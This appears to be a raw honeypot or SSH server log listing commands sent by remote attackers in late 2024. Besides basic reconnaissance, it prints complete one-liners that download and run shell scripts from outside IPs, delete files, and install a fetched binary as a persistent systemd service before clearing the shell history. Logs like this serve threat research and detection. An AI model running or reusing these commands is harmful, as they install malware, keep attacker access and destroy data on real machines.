start
2024-11-29 15:36:02.394635 - ('91.227.62.23', 56098) - whoami
2024-12-01 14:18:33.318167 - ('79.137.202.88', 54944) - uname -a
2024-12-01 14:18:34.110019 - ('79.137.202.88', 54952) - uname -a
2024-12-01 14:35:24.176716 - ('178.128.161.183', 33072) - uname -s -m
2024-12-01 15:03:56.688332 - ('87.120.113.231', 57576) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-01 15:30:56.775088 - ('218.157.163.203', 57404) - scp -t /tmp/G1cQNZL9
2024-12-01 15:30:57.671626 - ('218.157.163.203', 55142) - scp -t /tmp/G1cQNZL9
2024-12-01 17:18:53.976799 - ('87.120.113.231', 43584) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-01 17:38:19.283838 - ('87.120.113.231', 35286) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-01 19:59:54.473593 - ('91.227.62.22', 56048) - cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://64.235.45.196/ohshit.sh; curl -O http://64.235.45.196/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 64.235.45.196 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 64.235.45.196; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 64.235.45.196 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
2024-12-01 19:59:55.890521 - ('91.227.62.22', 56060) - cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://64.235.45.196/ohshit.sh; curl -O http://64.235.45.196/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 64.235.45.196 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 64.235.45.196; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 64.235.45.196 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
2024-12-01 19:59:59.071027 - ('91.227.62.22', 56082) - cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://64.235.45.196/ohshit.sh; curl -O http://64.235.45.196/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 64.235.45.196 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 64.235.45.196; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 64.235.45.196 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
2024-12-01 20:00:00.918252 - ('91.227.62.22', 50808) - cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://64.235.45.196/ohshit.sh; curl -O http://64.235.45.196/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 64.235.45.196 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 64.235.45.196; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 64.235.45.196 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
2024-12-01 20:00:02.104360 - ('91.227.62.22', 50838) - cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://64.235.45.196/ohshit.sh; curl -O http://64.235.45.196/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 64.235.45.196 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 64.235.45.196; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 64.235.45.196 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
2024-12-01 20:00:04.057820 - ('91.227.62.22', 50850) - cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://64.235.45.196/ohshit.sh; curl -O http://64.235.45.196/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 64.235.45.196 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 64.235.45.196; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 64.235.45.196 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
2024-12-01 20:00:05.577495 - ('91.227.62.22', 50864) - cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://64.235.45.196/ohshit.sh; curl -O http://64.235.45.196/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 64.235.45.196 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 64.235.45.196; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 64.235.45.196 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
2024-12-01 20:00:06.897696 - ('91.227.62.22', 50874) - cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://64.235.45.196/ohshit.sh; curl -O http://64.235.45.196/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 64.235.45.196 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 64.235.45.196; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 64.235.45.196 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
2024-12-01 20:00:08.556345 - ('91.227.62.22', 50898) - cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://64.235.45.196/ohshit.sh; curl -O http://64.235.45.196/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 64.235.45.196 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 64.235.45.196; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 64.235.45.196 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
2024-12-01 23:07:42.812041 - ('45.148.10.203', 42628) - apt
2024-12-01 23:07:43.092180 - ('45.148.10.203', 42628) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:07:48.135586 - ('45.148.10.203', 41392) - apt
2024-12-01 23:07:48.398788 - ('45.148.10.203', 41392) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:07:53.061612 - ('45.148.10.203', 41396) - apt
2024-12-01 23:07:53.265300 - ('45.148.10.203', 41396) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:07:59.308332 - ('45.148.10.203', 41718) - apt
2024-12-01 23:07:59.565576 - ('45.148.10.203', 41718) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:08:04.374026 - ('45.148.10.203', 41780) - apt
2024-12-01 23:08:04.559847 - ('45.148.10.203', 41780) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:08:10.373685 - ('45.148.10.203', 34698) - apt
2024-12-01 23:08:10.554388 - ('45.148.10.203', 34698) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:08:15.507905 - ('45.148.10.203', 34712) - apt
2024-12-01 23:08:15.768344 - ('45.148.10.203', 34712) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:08:20.573022 - ('45.148.10.203', 55080) - apt
2024-12-01 23:08:20.779923 - ('45.148.10.203', 55080) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:08:25.165800 - ('45.148.10.203', 55110) - apt
2024-12-01 23:08:25.715856 - ('45.148.10.203', 55110) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:08:32.459460 - ('45.148.10.203', 60586) - apt
2024-12-01 23:08:32.663148 - ('45.148.10.203', 60586) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:08:37.743510 - ('45.148.10.203', 48700) - apt
2024-12-01 23:08:37.940568 - ('45.148.10.203', 48700) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:08:43.261112 - ('45.148.10.203', 48722) - apt
2024-12-01 23:08:43.428000 - ('45.148.10.203', 48722) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:08:48.689130 - ('45.148.10.203', 54292) - apt
2024-12-01 23:08:48.985006 - ('45.148.10.203', 54292) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:08:53.673642 - ('45.148.10.203', 54326) - apt
2024-12-01 23:08:53.879558 - ('45.148.10.203', 54326) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:08:58.911302 - ('45.148.10.203', 60006) - apt
2024-12-01 23:08:59.086387 - ('45.148.10.203', 60006) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:09:04.201974 - ('45.148.10.203', 60020) - apt
2024-12-01 23:09:04.340284 - ('45.148.10.203', 60020) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:09:08.776312 - ('45.148.10.203', 32906) - apt
2024-12-01 23:09:08.976499 - ('45.148.10.203', 32906) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:09:14.294263 - ('45.148.10.203', 32944) - apt
2024-12-01 23:09:14.667856 - ('45.148.10.203', 32944) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:09:19.540228 - ('45.148.10.203', 49098) - apt
2024-12-01 23:09:19.700810 - ('45.148.10.203', 49098) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:09:25.447126 - ('45.148.10.203', 49112) - apt
2024-12-01 23:09:25.695612 - ('45.148.10.203', 49112) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:09:30.597501 - ('45.148.10.203', 55886) - apt
2024-12-01 23:09:30.808695 - ('45.148.10.203', 55886) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:09:35.399669 - ('45.148.10.203', 55914) - apt
2024-12-01 23:09:35.609295 - ('45.148.10.203', 55914) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:09:40.472618 - ('45.148.10.203', 60212) - apt
2024-12-01 23:09:40.760197 - ('45.148.10.203', 60212) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:09:45.541590 - ('45.148.10.203', 60238) - apt
2024-12-01 23:09:45.790327 - ('45.148.10.203', 60238) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:09:51.286060 - ('45.148.10.203', 53518) - apt
2024-12-01 23:09:51.519066 - ('45.148.10.203', 53518) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:09:56.909030 - ('45.148.10.203', 50440) - apt
2024-12-01 23:09:57.116479 - ('45.148.10.203', 50440) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:10:02.520342 - ('45.148.10.203', 50494) - apt
2024-12-01 23:10:02.722610 - ('45.148.10.203', 50494) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:10:07.451481 - ('45.148.10.203', 46754) - apt
2024-12-01 23:10:07.610065 - ('45.148.10.203', 46754) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:10:12.959600 - ('45.148.10.203', 46764) - apt
2024-12-01 23:10:13.129342 - ('45.148.10.203', 46764) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:10:18.143912 - ('45.148.10.203', 47516) - apt
2024-12-01 23:10:18.337505 - ('45.148.10.203', 47516) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:10:23.856978 - ('45.148.10.203', 47520) - apt
2024-12-01 23:10:24.494236 - ('45.148.10.203', 47520) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:10:29.060182 - ('45.148.10.203', 38894) - apt
2024-12-01 23:10:29.270068 - ('45.148.10.203', 38894) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 23:10:34.390482 - ('45.148.10.203', 38924) - apt
2024-12-01 23:10:34.682974 - ('45.148.10.203', 38924) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
